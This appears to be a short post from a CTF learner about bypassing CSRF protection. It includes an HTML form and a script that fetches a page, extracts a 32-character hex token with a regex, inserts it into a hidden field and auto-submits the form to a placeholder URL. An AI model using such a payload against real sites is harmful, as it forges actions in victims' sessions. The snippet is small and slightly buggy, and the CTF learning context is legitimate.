item.title: CSRF Token Extraction
item.description: So I was doing a CTF challenge and I have learned how to bypass CSRF token protection with extracting the token. I had to remove the CSRF code as the CTF forbids leaking solutions. <form action="<url goes here>" method="post" name="csrf" enctype="multipart/form-data"> <input ... /> <input id="token" type="hidden" name="token" value="" /> <button type="submit">Submit</button> </form> <script> xhttp = new XMLHttpRequest(); xhttp.open("GET", "<url goes here>", false); xhttp.send(); token_admin = (xhttp.responseText.match(/[abcdef0123456789]{32}/)); document.getElementById('token').setAttribute('value', token_admin) document.csrf_form.submit(); </script> What is this token?
